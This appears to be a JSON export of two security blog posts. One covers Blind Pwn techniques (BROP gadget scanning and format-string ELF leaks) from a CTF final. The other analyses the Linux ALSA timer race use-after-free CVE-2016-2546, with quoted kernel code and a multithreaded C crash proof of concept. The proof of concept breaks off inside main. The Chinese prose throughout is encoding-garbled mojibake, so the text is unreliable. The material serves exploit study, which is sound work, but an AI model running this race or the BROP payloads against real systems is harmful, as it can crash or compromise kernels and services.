[{"content":"Blind Pwnçš„ä¸€äº›æ€è€ƒ é—²èŠ 2025å¹´é•¿åŸæ¯å†³èµ›æ¸—é€å‡ºç°äº†ä¸€ä¸ªpwnæœåŠ¡ï¼Œç„¶è€Œå¹¶æ²¡æœ‰é™„ä»¶ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ˜¯format stringç±»å‹çš„æ¼æ´ï¼Œä¸ç¦æƒ³èµ·Blind Pwnï¼Œä½†æ˜¯æ‰“çš„åˆå°‘ï¼Œå¯¼è‡´æµªè´¹äº†å¥½å‡ ä¸ªå°æ—¶â€¦\næœŸé—´å¯¹åˆ©ç”¨çš„ä¸€äº›æ€è€ƒï¼Œå€Ÿæ­¤æœºä¼šè®°å½•ä¸€ä¸‹\né—®é¢˜çš„å…³é”® é—®é¢˜çš„å…³é”®æ˜¯æ— ä»»ä½•æœ‰æ•ˆä¿¡æ¯ï¼Œå³ä½¿æ ˆæº¢å‡ºä¹Ÿä¸çŸ¥é“åº”è¯¥è·³è½¬åˆ°å“ªé‡Œ\nå¯¹æ­¤æœ‰ä¸¤ç§æ€è·¯\nçˆ†ç ´åœ°å€è§‚å¯Ÿç¨‹åºç›¸åº”æƒ…å†µï¼Œæ¥åˆ¤æ–­æ˜¯å¦è¿›å…¥äº†æŸäº›å‡½æ•°ï¼ˆå¦‚è¾“å‡ºå‡½æ•°ï¼Œmainå‡½æ•°ç­‰ï¼‰ï¼Œè¿™ç§å¯¹åº”çš„æ‰‹æ³•åº”è¯¥æ˜¯BROPï¼ˆåˆ©ç”¨æ¡ä»¶ä¸ºçº¯æ ˆæº¢å‡ºï¼ŒNO PIEï¼‰ é€šè¿‡fmtæ¼æ´ç›´æ¥leak elfæ•°æ®ï¼ˆ%s-%pç­‰æ¥ç¡®è®¤ï¼‰ï¼Œè¿™ç§æ‰‹æ³•åˆ©ç”¨æ¡ä»¶ä¸ºformat stringæ¼æ´ æ— è®ºæ˜¯å“ªç§æ€è·¯ï¼Œç¬¬ä¸€å¤§æ­¥çš„ç›®çš„å°±æ˜¯å¯»æ‰¾åˆ°puts/printf/writeè¿™äº›å‡½æ•°ï¼Œè¿›ä¸€æ­¥æ³„éœ²æ•´ä¸ªelfï¼Œå½“è¿™ä¸€æ­¥å®Œæˆçš„æ—¶å€™ï¼Œå°±å’Œæ™®é€špwnæ²¡æœ‰åŒºåˆ«äº†\nBROP è¿™ç§æ‰‹æ³•éœ€è¦å¤§é‡å°è¯•/çˆ†ç ´ï¼Œåˆ©ç”¨æ¡ä»¶ä¸ºæ ˆæº¢å‡º/NO PIEï¼Œåœ¨æ²¡æœ‰PIEä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ç¨‹åºçš„elf baseï¼Œç„¶ååœ¨æŒŸæŒæ‰§è¡Œæµçš„æ—¶å€™ï¼Œå°†è¿”å›åœ°å€éå†æŒŸæŒæ•´ä¸ªelfä»£ç æ®µçš„æ¯ä¸ªåœ°å€ï¼Œå¯»æ‰¾å¯¹åº”gadgets\nStopping gadgets Stopping gadgetsæŒ‡çš„æ˜¯è®©ç¨‹åºå¡ä½ä½†ä¸å´©æºƒçš„gadgetï¼Œæ¯”å¦‚main/_startï¼Œè¿™å‡ ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå®ƒä¼šè®©ç¨‹åºé‡å¯ï¼Œä½†ä¸ä¼šæ–­å¼€socketé“¾æ¥ï¼Œé€šè¿‡è¿™ä¸€ç°è±¡å°±å¯ä»¥åˆ¤æ–­æ˜¯å¦æ‹¿åˆ°Stopping gadgetsã€‚\nStopping gadgetsä¼šä¸ºä¸‹ä¸€æ­¥æ‹¿åˆ°å…¶ä»–gadgetsä½œä¸ºä¸€ä¸ªä¾é \nregister gadgets ä¸‹ä¸€æ­¥å¯»æ‰¾register gadgetsï¼Œè¿™ä¸€æ­¥ä¸ç¡®å®šæ€§æŒºå¤§çš„\nå¦‚éœ€è¦å¯»æ‰¾pop rdi; ret è¿™ä¸ªgadgetï¼Œå°†payloadè®¾ç½®ä¸º\n1 2 3 4 5 flat([ padding, pop_rdi, 0, Stopping gadget ]) è¿™ä¸ªpayloadä¼šå°†è®¾pop_rdiçš„åœ°å€æ»¡è¶³å®ƒæ˜¯ä¸€ä¸ªpop xxx ; ret ç»“æ„ï¼Œç„¶åä¸èƒ½å½±å“åé¢è¿›å…¥Stopping gadget\næ‰€ä»¥ä¾èµ–è¿™ä¸ªStopping gadgetï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç¨‹åºå¦‚æœæŒ‚äº†ï¼Œé‚£å°±è¿™ä¸ªåœ°å€ä¸æ»¡è¶³ï¼Œå¦åˆ™åº”è¯¥æ˜¯æ»¡è¶³è¿™ä¸ªç»“æ„çš„\nleak functions æ¥ä¸‹æ¥ä¸‹ä¸€æ­¥éœ€è¦å¯»æ‰¾èƒ½å¤Ÿè¾“å‡ºçš„å‡½æ•°ï¼Œæ¯”å¦‚puts /printf /write è¿™å‡ ä¸ªï¼Œè¿™ä¸€æ­¥åŒæ ·ä¾èµ–äºä¸Šé¢çš„register gadgetsä»¥åŠStopping gadgets\næ„é€ payloadå¦‚\nputs /printf\n1 2 3 4 5 6 flat([ padding, pop_rdi, xxx, puts_addr, Stopping gadget ]) è¿™é‡Œçš„puts_addréœ€è¦éå†æ•´ä¸ªä»£ç æ®µï¼Œpop_rdiæœ‰å¤šç§æƒ…å†µï¼Œå–å†³äºå¾—åˆ°æ»¡è¶³çš„register gadgetsæ•°é‡ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥éœ€è¦çˆ†ç ´çš„æ›´å¤š\nè¿™é‡Œxxxå¡«ä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ELFç¨‹åºæœ‰ä¸ªheaderï¼Œé‡Œé¢çš„å€¼æ˜¯\\x7fELFå¼€å¤´çš„\næ‰€ä»¥æŠŠxxxå¡«ä¸º0x400000 å³å¯\nå¦‚æœæˆåŠŸæ‰¾åˆ°ï¼Œé‚£ä¹ˆå°±ä¼šè¾“å‡º\\x7fELF\nwrite\n1 2 3 4 5 6 7 8 flat([ padding, pop_rdi, 1, pop_rsi, xxx, pop_rdx, 0x50, puts_addr, Stopping gadget ]) ä½¿ç”¨writeè¾“å‡ºå°±ä¼šæ›´åŠ å¤æ‚ï¼Œå› ä¸ºéœ€è¦çˆ†ç ´çš„æ¬¡æ•°å˜æˆäº†puts_addrå¯èƒ½å€¼ * register gadgetsæ•°é‡^3\nç†è®ºå¯è¡Œï¼Œä½†å®é™…ä¸Šä¼°è®¡å¾ˆéš¾çˆ†å‡ºæ¥\nLeak ELF å½“ä¸Šé¢çš„ä¸‰ç§gadgetså…¨éƒ¨æ‰¾åˆ°ä¹‹åï¼Œæˆ‘ä»¬å°±èƒ½ç¡®å®šä¸€æ•´æ¡leaké“¾äº†ï¼Œé€šè¿‡æŒŸæŒæ‰§è¡Œæµä¸»åŠ¨è°ƒç”¨è¿™æ¡åˆ©ç”¨é“¾å°±å¯ä»¥æŠŠæ•´ä¸ªELF dumpä¸‹æ¥ï¼Œåé¢å°±ä¸æ˜¯ä»€ä¹ˆéš¾äº‹äº†\nFormat String in Blind Pwn è¿™ç§æƒ…å†µä¸‹ä¼šç›¸å¯¹äºBROPæ›´åŠ ç®€å•(å—?)\nfmtæ¼æ´åˆåˆ†ä¸ºæ ˆä¸Šå’Œå †ä¸Šä¸¤ç§\nå¯¹äºæ ˆä¸Šè‡ªç„¶æ˜¯å¥½åšçš„ï¼Œç›´æ¥å°±å¯ä»¥å¾€æ ˆé‡Œå¸ƒç½®elfæŒ‡é’ˆï¼Œç„¶åé€šè¿‡%s æ¥æ³„éœ²å¯¹åº”åœ°å€ï¼Œè™½ç„¶\\x00 æ— æ³•è·çŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ— è¾“å‡ºæ¥åˆ¤æ–­\nå †ä¸Šå…¶å®ä¹Ÿå¥½åšï¼ŒåŒºåˆ«åœ¨äºéœ€è¦å…ˆé€šè¿‡%n é“¾å­æ¥å¯¹æŒ‡é’ˆè¿›è¡Œä¿®æ”¹ï¼Œè¿™é‡Œéœ€è¦å›å¿†ä¸€ä¸‹å †ä¸Šfmt pwnæ˜¯æ€ä¹ˆåšçš„ï¼Œæœ€é€šç”¨çš„åšæ³•å°±æ˜¯åˆ©ç”¨æ ˆä¸Šç¯å¢ƒå˜é‡çš„æŒ‡é’ˆï¼Œå®ƒçš„ç»“æ„é•¿è¿™æ ·ï¼š\nA: Bâ†’C(\u0026quot;/home/hkbin/pwn\u0026quot;)\nåœ¨Aåœ°å€ä¸Šï¼Œå­˜åœ¨BæŒ‡é’ˆï¼ŒæŒ‡å‘Cï¼ŒCçš„å†…å®¹æ˜¯ç¯å¢ƒå˜é‡\næ­¤æ—¶é€šè¿‡%n ç³»åˆ—çš„fmtï¼Œä¿®æ”¹Cçš„å€¼ï¼Œè®©å®ƒä¸€æ­¥æ­¥æˆä¸ºä¸€ä¸ªæ ˆåœ°å€\næ­¤æ—¶å°±å˜æˆè¿™æ ·çš„é“¾å­\nA: B-\u0026gt;C-\u0026gt;D(xxx)\nåç»­å³å¯é…åˆA: B-\u0026gt;C ä»¥åŠB: C-\u0026gt;D è¿™ä¸¤æ¡é“¾å­å®ç°ä»»æ„åœ°å€è¯»å†™äº†\nå¯¹äºBlind PwnåŒæ ·ä¹Ÿå¯ä»¥è¿™æ ·åšï¼Œåˆ›é€ äº†è‡ªå·±çš„B: C-\u0026gt;D é“¾å­ä¹‹åå°±å¯ä»¥å»leak ELFäº†\nä½†æ˜¯ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ„é€ B: C-\u0026gt;D é“¾å­çš„æˆæœ¬æ¯”è¾ƒé«˜ï¼Œéœ€è¦å¾ˆé•¿çš„payloadï¼Œå¹¶ä¸”å¾€å¾€éœ€è¦ä½¿ç”¨%lln ï¼Œ1byte1byteåœ°å†™å…¥ï¼Œé€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œä¹Ÿæ¯”è¾ƒå¤æ‚\nå›åˆ°é—²èŠ é•¿åŸæ¯é¢˜ç›®ç¯å¢ƒæ˜¯æ ˆä¸Šçš„fmtæ¼æ´ï¼Œé‚£ä¸ºå•¥å¾ˆéš¾æ‰“å‘¢ï¼Œå› ä¸ºä»–ä¼š\\x00 æˆªæ–­\nåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬æ— æ³•éšæ„åœ°æ’å…¥ä¾‹å¦‚0x400000 è¿™æ ·çš„åœ°å€ï¼Œè¿™ä¼šå¯¼è‡´ä¸€äº›å¯¹é½åçš„å‡½æ•°æ²¡æ³•å®Œå¥½åœ°dumpä¸‹æ¥ï¼Œå¹¶ä¸”è¾“å…¥é•¿åº¦ä¹Ÿæœ‰é™ï¼Œæƒ³æ„é€ ç±»ä¼¼å †ä¸Šfmtçš„é“¾å­ä¹Ÿæ— æ³•å®Œæˆ(\nğŸ˜­ ğŸ˜­\n","date":"2025-04-28T22:06:57+08:00","permalink":"https://hkbinbin.github.io/p/blind-pwn%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/","title":"Blind Pwnçš„ä¸€äº›æ€è€ƒ"},{"content":"CVE-2016-2546åˆ†æ æ¼æ´æè¿° åœ¨linuxå†…æ ¸4.4.1ä¹‹å‰ï¼Œå¯¹sound/core/timer.c ä¸­é”çš„è®¾ç½®é€»è¾‘æœ‰é—®é¢˜ï¼Œå¯¼è‡´snd_timer_user_ioctl å‡½æ•°å­˜åœ¨æ™®éçš„ç«äº‰é—®é¢˜ã€‚\nä¸€ä¸ªç«äº‰ä¾‹å­ snd_timer_user_tselect å’Œsnd_timer_user_start å‡½æ•°\nä¸¤è€…éƒ½é€šè¿‡snd_timer_user_ioctl å‡½æ•°è¿›è¡Œè°ƒç”¨\nåœ¨snd_timer_user_tselect å‡½æ•°ä¸­\nè¿™ä¸ªå‡½æ•°ä¸»è¦è¡Œä¸ºæ˜¯åˆ‡æ¢è®¡æ—¶å™¨timerï¼Œå¹¶åˆ›å»ºå®ä¾‹timer instance\nåˆ†æè¿™ä¸ªå‡½æ•°ä»£ç å¼€å¤´ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 static int snd_timer_user_tselect(struct file *file, struct snd_timer_select __user *_tselect) { struct snd_timer_user *tu; struct snd_timer_select tselect; char str[32]; int err = 0; tu = file-\u0026gt;private_data; mutex_lock(\u0026amp;tu-\u0026gt;tread_sem); if (tu-\u0026gt;timeri) { // è¿™é‡ŒåŸæ„æ˜¯åœ¨åˆ‡æ¢timer instance snd_timer_close(tu-\u0026gt;timeri); tu-\u0026gt;timeri = NULL; } if (copy_from_user(\u0026amp;tselect, _tselect, sizeof(tselect))) { err = -EFAULT; goto __err; } sprintf(str, \u0026#34;application %i\u0026#34;, current-\u0026gt;pid); if (tselect.id.dev_class != SNDRV_TIMER_CLASS_SLAVE) // å¦‚æœä¸æ˜¯slaveï¼Œæ‹¿å°†slave_classè®¾ç½®ä¸ºapplication tselect.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION; err = snd_timer_open(\u0026amp;tu-\u0026gt;timeri, str, \u0026amp;tselect.id, current-\u0026gt;pid); if (err \u0026lt; 0) goto __err; kfree(tu-\u0026gt;queue); tu-\u0026gt;queue = NULL; kfree(tu-\u0026gt;tqueue); tu-\u0026gt;tqueue = NULL; if (tu-\u0026gt;tread) { tu-\u0026gt;tqueue = kmalloc(tu-\u0026gt;queue_size * sizeof(struct snd_timer_tread), GFP_KERNEL); if (tu-\u0026gt;tqueue == NULL) err = -ENOMEM; } else { tu-\u0026gt;queue = kmalloc(tu-\u0026gt;queue_size * sizeof(struct snd_timer_read), GFP_KERNEL); if (tu-\u0026gt;queue == NULL) err = -ENOMEM; } if (err \u0026lt; 0) { // if error snd_timer_close(tu-\u0026gt;timeri); // key 1 tu-\u0026gt;timeri = NULL; } else { tu-\u0026gt;timeri-\u0026gt;flags |= SNDRV_TIMER_IFLG_FAST; tu-\u0026gt;timeri-\u0026gt;callback = tu-\u0026gt;tread ? snd_timer_user_tinterrupt : snd_timer_user_interrupt; tu-\u0026gt;timeri-\u0026gt;ccallback = snd_timer_user_ccallback; tu-\u0026gt;timeri-\u0026gt;callback_data = (void *)tu; } __err: mutex_unlock(\u0026amp;tu-\u0026gt;tread_sem); return err; } åœ¨å¼€å¤´åˆ¤æ–­å¦‚æœå½“å‰user timer å·²ç»æœ‰äº†timer instance ï¼Œé‚£å°±å…ˆå»é”€æ¯è¿™ä¸ªå®ä¾‹ï¼Œä¹‹åå†å»åˆ›å»ºæ–°çš„å®ä¾‹\nè€Œåœ¨snd_timer_close å‡½æ•°ä¸­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 /* * close a timer instance */ int snd_timer_close(struct snd_timer_instance *timeri) { struct snd_timer *timer = NULL; struct snd_timer_instance *slave, *tmp; if (snd_BUG_ON(!timeri)) return -ENXIO; /* force to stop the timer */ snd_timer_stop(timeri); if (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_SLAVE) { /* wait, until the active callback is finished */ spin_lock_irq(\u0026amp;slave_active_lock); while (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_CALLBACK) { spin_unlock_irq(\u0026amp;slave_active_lock); udelay(10); spin_lock_irq(\u0026amp;slave_active_lock); } spin_unlock_irq(\u0026amp;slave_active_lock); mutex_lock(\u0026amp;register_mutex); list_del(\u0026amp;timeri-\u0026gt;open_list); mutex_unlock(\u0026amp;register_mutex); } else { timer = timeri-\u0026gt;timer; if (snd_BUG_ON(!timer)) goto out; /* wait, until the active callback is finished */ spin_lock_irq(\u0026amp;timer-\u0026gt;lock); while (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_CALLBACK) { spin_unlock_irq(\u0026amp;timer-\u0026gt;lock); udelay(10); spin_lock_irq(\u0026amp;timer-\u0026gt;lock); } spin_unlock_irq(\u0026amp;timer-\u0026gt;lock); mutex_lock(\u0026amp;register_mutex); list_del(\u0026amp;timeri-\u0026gt;open_list); if (timer \u0026amp;\u0026amp; list_empty(\u0026amp;timer-\u0026gt;open_list_head) \u0026amp;\u0026amp; timer-\u0026gt;hw.close) timer-\u0026gt;hw.close(timer); /* remove slave links */ list_for_each_entry_safe(slave, tmp, \u0026amp;timeri-\u0026gt;slave_list_head, open_list) { spin_lock_irq(\u0026amp;slave_active_lock); _snd_timer_stop(slave, 1, SNDRV_TIMER_EVENT_RESOLUTION); list_move_tail(\u0026amp;slave-\u0026gt;open_list, \u0026amp;snd_timer_slave_list); slave-\u0026gt;master = NULL; slave-\u0026gt;timer = NULL; spin_unlock_irq(\u0026amp;slave_active_lock); } mutex_unlock(\u0026amp;register_mutex); } out: if (timeri-\u0026gt;private_free) timeri-\u0026gt;private_free(timeri); kfree(timeri-\u0026gt;owner); kfree(timeri); if (timer) module_put(timer-\u0026gt;module); return 0; } åœ¨è¿™é‡Œå…ˆä¸çœ‹å‰é¢çš„ä¸€å¤§å †ä»£ç ï¼Œä¹‹åçœ‹åé¢kfree(timeri)\nå¯ä»¥å‘ç°è¿™é‡Œé‡Šæ”¾æ‰äº†timer instance\nåˆ†æå¦ä¸€ä¸ªå‡½æ•°snd_timer_user_start\n1 2 3 4 5 6 7 8 9 10 11 12 13 static int snd_timer_user_start(struct file *file) { int err; struct snd_timer_user *tu; tu = file-\u0026gt;private_data; if (!tu-\u0026gt;timeri) return -EBADFD; snd_timer_stop(tu-\u0026gt;timeri); // å…ˆstop åœ¨start tu-\u0026gt;timeri-\u0026gt;lost = 0; tu-\u0026gt;last_resolution = 0; return (err = snd_timer_start(tu-\u0026gt;timeri, tu-\u0026gt;ticks)) \u0026lt; 0 ? err : 0; } è¿™ä¸ªå‡½æ•°çš„ä¸»è¦è¡Œä¸ºæ˜¯å¯åŠ¨è®¡æ—¶å™¨ï¼Œæ‰€ä»¥è¡Œä¸ºæ˜¯å…ˆå…³é—­æ—§çš„è®¡æ—¶å™¨å†å¼€å¯æ–°çš„è®¡æ—¶å™¨\nåé¢è¿›å…¥çš„å°±æ˜¯snd_timer_start å‡½æ•°ï¼Œè¿™é‡Œå¯¹timer instance è¿›è¡Œäº†æ“ä½œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /* * start the timer instance */ int snd_timer_start(struct snd_timer_instance *timeri, unsigned int ticks) { struct snd_timer *timer; int result = -EINVAL; unsigned long flags; if (timeri == NULL || ticks \u0026lt; 1) return -EINVAL; if (timeri-\u0026gt;flags \u0026amp; SNDRV_TIMER_IFLG_SLAVE) { result = snd_timer_start_slave(timeri); snd_timer_notify1(timeri, SNDRV_TIMER_EVENT_START); return result; } timer = timeri-\u0026gt;timer; if (timer == NULL) return -EINVAL; spin_lock_irqsave(\u0026amp;timer-\u0026gt;lock, flags); timeri-\u0026gt;ticks = timeri-\u0026gt;cticks = ticks; timeri-\u0026gt;pticks = 0; result = snd_timer_start1(timer, timeri, ticks); spin_unlock_irqrestore(\u0026amp;timer-\u0026gt;lock, flags); snd_timer_notify1(timeri, SNDRV_TIMER_EVENT_START); return result; } å¯ä»¥æ¨ç†å‡ºå½“ä¸¤ä¸ªçº¿ç¨‹åˆ†åˆ«è¿›å…¥snd_timer_tselect ä»¥åŠsnd_timer_start å‡½æ•°ä¸­\nåœ¨snd_timer_tselect å¯¹timer instance æŒ‡é’ˆè¿›è¡Œé‡Šæ”¾ä¹‹åï¼Œsnd_timer_start ä»å¯ä»¥å¯¹å·²é‡Šæ”¾çš„å †å—è¿›è¡Œæ“ä½œï¼Œé€ æˆUAFæ¼æ´ã€‚\nCrash POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 #define _GNU_SOURCE #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;linux/futex.h\u0026gt; #include \u0026lt;linux/soundcard.h\u0026gt; #include \u0026lt;sys/soundcard.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;sound/asound.h\u0026gt; static const char *const event_labels[] = { [SNDRV_TIMER_EVENT_RESOLUTION] = \u0026#34;resolution\u0026#34;, [SNDRV_TIMER_EVENT_TICK] = \u0026#34;tick\u0026#34;, [SNDRV_TIMER_EVENT_START] = \u0026#34;start\u0026#34;, [SNDRV_TIMER_EVENT_STOP] = \u0026#34;stop\u0026#34;, [SNDRV_TIMER_EVENT_CONTINUE] = \u0026#34;continue\u0026#34;, [SNDRV_TIMER_EVENT_PAUSE] = \u0026#34;pause\u0026#34;, [SNDRV_TIMER_EVENT_EARLY] = \u0026#34;early\u0026#34;, [SNDRV_TIMER_EVENT_SUSPEND] = \u0026#34;suspend\u0026#34;, [SNDRV_TIMER_EVENT_RESUME] = \u0026#34;resume\u0026#34;, [SNDRV_TIMER_EVENT_MSTART] = \u0026#34;mstart\u0026#34;, [SNDRV_TIMER_EVENT_MSTOP] = \u0026#34;mstop\u0026#34;, [SNDRV_TIMER_EVENT_MCONTINUE] = \u0026#34;mcontinue\u0026#34;, [SNDRV_TIMER_EVENT_MPAUSE] = \u0026#34;mpause\u0026#34;, [SNDRV_TIMER_EVENT_MSUSPEND] = \u0026#34;msuspend\u0026#34;, [SNDRV_TIMER_EVENT_MRESUME] = \u0026#34;mresume\u0026#34;, }; size_t IOCTL_PVERSION(int fd) { size_t version; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_PVERSION, \u0026amp;version); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get version\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } return version; } void IOCTL_PARAMS(int fd) { /* See SNDRV_TIMER_PSFLG_XXX. */ const char *const flag_labels[] = { [0] = \u0026#34;auto\u0026#34;, [1] = \u0026#34;exclusive\u0026#34;, [2] = \u0026#34;early-event\u0026#34;, }; int i; struct snd_timer_params params; memset(\u0026amp;params, 0, sizeof(params)); params.flags = SNDRV_TIMER_PSFLG_AUTO | SNDRV_TIMER_PSFLG_EXCLUSIVE; params.ticks = 1; params.queue_size = 1; params.filter = (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_RESOLUTION) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_TICK) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_START) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_STOP) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_CONTINUE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_PAUSE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_SUSPEND) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_RESUME) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSTART) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSTOP) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MCONTINUE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MPAUSE) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MSUSPEND) | (1 \u0026lt;\u0026lt; SNDRV_TIMER_EVENT_MRESUME); int errno = ioctl(fd, SNDRV_TIMER_IOCTL_PARAMS, \u0026amp;params); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get params\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;params:\\n\u0026#34;); printf(\u0026#34; flags: \u0026#34;); for (i = 0; i \u0026lt; sizeof(flag_labels)/sizeof(flag_labels[0]); ++i) { if (params.flags \u0026amp; (1 \u0026lt;\u0026lt; i)) printf(\u0026#34;%s, \u0026#34;, flag_labels[i]); } printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34; ticks: %d\\n\u0026#34;, params.ticks); printf(\u0026#34; queue-size: %d\\n\u0026#34;, params.queue_size); printf(\u0026#34; filter(%08x): \u0026#34;, params.filter); for (i = 0; i \u0026lt; sizeof(event_labels)/sizeof(event_labels[0]); ++i) { if (params.filter \u0026amp; (1 \u0026lt;\u0026lt; i)) printf(\u0026#34;%s, \u0026#34;, event_labels[i]); } printf(\u0026#34;\\n\u0026#34;); } void IOCTL_THREAD(int fd) { int flag = 1; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_TREAD, \u0026amp;flag); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in create time thread\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] time thread create successfully\\n\u0026#34;); } void IOCTL_SELECT(int fd) { struct snd_timer_select select = {0}; select.id.dev_class = SNDRV_TIMER_CLASS_PCM; select.id.dev_sclass = 0; select.id.card = 1; select.id.device = 0; select.id.subdevice = 0; int errno = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in time dev select\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] time dev select successfully\\n\u0026#34;); } void IOCTL_INFO(int fd) { struct snd_timer_info info; memset(\u0026amp;info, 0, sizeof(info)); int errno = ioctl(fd, SNDRV_TIMER_IOCTL_INFO, \u0026amp;info); if (errno \u0026lt; 0) { perror(\u0026#34;Failed in get info\\n\u0026#34;); printf(\u0026#34;[-] errno: %d\\n\u0026#34;, errno); _exit(1); } printf(\u0026#34;[+] Timer info: card=%d, id=%s, name:%s\\n\u0026#34;, info.card, info.id, info.name); } void IOCTL_INIT(int fd) { struct snd_timer_select select; memset(\u0026amp;select, 0, sizeof(select)); select.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL; // ä½¿ç”¨å…¨å±€å®šæ—¶å™¨ select.id.dev_sclass = SNDRV_TIMER_SCLASS_NONE; // æ— å­ç±» int ret = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to select timer source\u0026#34;); _exit(1); } // printf(\u0026#34;[+] init timer successfully\\n\u0026#34;); } void IOCTL_START(int fd) { int ret = ioctl(fd, SNDRV_TIMER_IOCTL_START, NULL); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to start timer\u0026#34;); _exit(1); } // printf(\u0026#34;[+] start timer successfully\\n\u0026#34;); } void IOCTL_INIT_FOR_MYSELF(int fd) { struct snd_timer_select select; memset(\u0026amp;select, 0, sizeof(select)); // è®¾ç½®ä¸ºç”¨æˆ·å®šæ—¶å™¨ select.id.dev_class = SNDRV_TIMER_CLASS_SLAVE; select.id.dev_sclass = SNDRV_TIMER_SCLASS_NONE; int ret = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, \u0026amp;select); if (ret \u0026lt; 0) { perror(\u0026#34;Failed to select user-defined timer\u0026#34;); _exit(1); } printf(\u0026#34;[+] User-defined timer selected successfully\\n\u0026#34;); } void *thread_tselect1(void *arg) { int fd = *(int *)arg; while (1) IOCTL_INIT(fd); return NULL; } void *thread_tselect2(void *arg) { int fd = *(int *)arg; while (1) IOCTL_START(fd); return NULL; } int main(){ int fd = open(\u0026#34;/dev/snd/timer\u0026#34;, O_RDWR | O_CLOEXEC); if(fd \u0026lt; 0){ perror(\u0026#34;open\u0026#34;); _exit(1); } // é…ç½®å®šæ—¶å™¨å‚æ•° struct snd_timer_params params; memset(\u0026amp;params, 0, sizeof(params)); params.flags = 0; params.ticks = 1000; // æ¯ç§’è§¦å‘ 1000 æ¬¡ params.queue_size = 32; // ä½¿ç”¨é»˜è®¤é˜Ÿåˆ— params.reserved0 = 1; // åˆ†è¾¨ç‡ï¼š1å¾®ç§’ // Get version long version; version = IOCTL_PVERSION(fd); printf(\u0026#34;[+] get version: %ld\\n\u0026#34;, version); // Get thread IOCTL_THREAD(fd); 